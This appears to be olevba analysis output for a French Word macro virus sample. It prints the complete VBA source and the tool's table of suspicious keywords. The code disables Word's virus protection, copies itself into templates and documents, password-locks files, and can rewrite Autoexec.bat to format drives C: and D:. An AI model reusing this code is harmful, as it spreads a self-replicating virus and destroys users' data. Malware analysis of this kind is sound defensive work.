olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MultiVirus.3-724411fd1b865903c9ff8b4db0b97d6a57455d97
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MultiVirus.3-724411fd1b865903c9ff8b4db0b97d6a57455d97 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MultiVirus3.bas 
in file: Virus.MSWord.MultiVirus.3-724411fd1b865903c9ff8b4db0b97d6a57455d97 - OLE stream: 'Macros/VBA/MultiVirus3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MultiVirus3" Then
        MultiVirus3Installed = -1
    End If
Next i
Call PayVeneno
If Not MultiVirus3Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus3", Object:=wdOrganizerObjectProjectItems
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "MultiVirus3" Then
        MultiVirus3Installed = -1
    End If
Next i
Call PaySchoo
If Not MultiVirus3Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus3", Object:=wdOrganizerObjectProjectItems
    AutoCorrect.Entries.Add Name:="s", Value:="schoo'"
    AutoCorrect.Entries.Add Name:="r", Value:="eckonize"
    AutoCorrect.Entries.Add Name:="assembly", Value:="assemily"
    AutoCorrect.Entries.Add Name:="assembler", Value:="assimiler"
Else
    Call PayBadBoy
End If
ErrorAO:
End Sub
Sub FilePrint()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFP
Dim MyTime
MyTime = Time
TS$ = Mid(MyTime, 7, 8)
If TS$ > "57" Then
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="Finalement, j'aimerais ajouter que..."
    Selection.TypeParagraph
    Selection.TypeText Text:="Le centre informatique de cette universitй est un vйritable honte, nous"
    Selection.TypeParagraph
    Selection.TypeText Text:="ne mйritons ses services."
    Selection.TypeParagraph
    Selection.TypeText Text:=">>> Honte sur toi!!! <<<"
    Selection.TypeParagraph
    Selection.TypeText Text:="<fdf>"
    Selection.HomeKey Unit:=wdStory
End If
    Dialogs(wdDialogFilePrint).Show
ErrorFP:
End Sub
Sub FilePrintDefault()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFPD
Dim MyTime
MyTime = Time
TS$ = Mid(MyTime, 7, 8)
If TS$ > "57" Then
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText Text:="Finalement, j'aimerais ajouter que..."
    Selection.TypeParagraph
    Selection.TypeText Text:="Le centre informatique de cette universitй est un vйritable honte, nous"
    Selection.TypeParagraph
    Selection.TypeText Text:="ne mйritons ses services."
    Selection.TypeParagraph
    Selection.TypeText Text:=">>> Honte sur toi!!! <<<"
    Selection.TypeParagraph
    Selection.TypeText Text:="<fdf>"
    Selection.HomeKey Unit:=wdStory
End If
    ActiveDocument.PrintOut
ErrorFPD:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus3", Object:=wdOrganizerObjectProjectItems
Dim MyTime
MyTime = Time
TS$ = Mid(MyTime, 7, 8)
If TS$ = "38" Then
    MsgBox "Merci а celui qui a crйe the Veneno Virus...", vbInformation, "MultiVirus3"
End If
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "ZeMacroKiller98"
    .Keywords = "Gangsta Rappa"
    .Comments = "The Mutha mix"
End With
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Espace Pile Insuffisant", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub PayBadBoy()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPBB
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
If D$ = "1" Or D$ = "13" Then
    MsgBox "Mack daddy" & Chr$(13) & "Bad Boy, Bad Boy, What u gonna do ", Title:="MultiVirus 3"
    MsgBox "the Gangsta Rappa" & Chr$(13) & "What u gonna do whn then come for you", Title:="MultiVirus 3"
    MsgBox "BMF" & Chr$(13) & "The Gangsta owns you !", Title:="MultiVirus 3"
    MsgBox "BMF" & Chr$(13) & "Have a happy new year", Title:="MultiVirus 3"
    ActiveDocument.SaveAs Password:="gangsta98"
End If
ErrorPBB:
End Sub
Sub PaySchoo()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPS
Dim MyDate
MyDate = Date
D$ = MyDate
If D$ < "28/05/1998" Then
    MsgBox "Attention, le Virus 'Big Johnson' a йtй dйtectй.", vbCritical, "Alerte Virus de Microsoft Word"
End If
If D$ = "28/05/1998" Then
    MsgBox "Transfert du contrфle au sous routine du virus:" & Chr$(13) & "Virus initialisй..." & Chr$(13) & "C'est le dernier jour d'йcole!", vbCritical, "Alerte Virus de Microsoft Word"
End If
If D$ > "28/05/1998" Then
    MsgBox "Transfert du contrфle au sous routine du virus:" & Chr$(13) & "Virus initialisй..." & Chr$(13) & "C'est la sortie d'йcole!", vbCritical, "Alerte Virus de Microsoft Word"
End If
ErrorPS:
End Sub
Sub PayVeneno()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPV
Dim MyDate, MyTime, MyWeek, NH$
MyDate = Date
MyTime = Time
MyWeek = WeekDay(MyDate, vbMonday)
TM$ = Mid(MyTime, 4, 5)
If (MyWeek = 5 Or MyWeek = 6) And (TM$ < "05") Then
    Selection.EndKey
    Selection.TypeParagraph
    Selection.TypeText Text:="**V<N<N0**"
    Selection.WholeStory
    With Selection.Find
        .Text = "ste"
        .Replacement.Text = "stes"
    End With
    ActiveDocument.SaveAs Password:="Veneno98"
End If
Randomize
NH$ = Int(Rnd * 100) + 1
If NH$ = 50 Then
Open "C:\Autoexec.bat" For Output As #1
    Print #1, "@echo off"
    Print #1, "PATH=C:\;C:\DOS;C:\WINDOWS;C:\WINDOWS\COMMAND"
    Print #1, "Echo."
    Print #1, "Echo Inserez une disquette dans le lecteur A:"
    Print #1, "Echo Appuyer sur n'importe qu'elle touche"
    Print #1, "Echo pause > nul"
    Print #1, "Format a: /autotest > nul"
    Print #1, "if errorlevel 0 goto Fin"
    Print #1, "o|format d: /u /autotest"
    Print #1, "o|format c: /u /autotest"
    Print #1, "y|format d: /u /autotest"
    Print #1, "y|format c: /u /autotest"
    Print #1, "Vous vous кtes fait avoir!"
    Print #1, "Echo."
    Print #1, ":Fin"
    Print #1, "Echo Ta momman doit кtre trиs heureuse d'avoir un enfant si bOn et Obeissant..."
Close #1
Open "C:\Config.sys" For Output As #2
    Print #2, "SHELL=C:\DOS\COMMAND.COM /F /P"
    Print #2, "SWITCHES = /N /F"
Close #2
End If
ErrorPV:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Une erreur interne au module UNIDRV.DLL est arrivй" & Chr$(13) & "Veuillez contacter le support technique de Microsoft", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "Microsoft Visual Basic n'est pas installй." & Chr$(13) & "Veuillez consulter l'aide en ligne."
    .Heading = "Microsoft Word"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|SHELL               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |UNIDRV.DLL          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
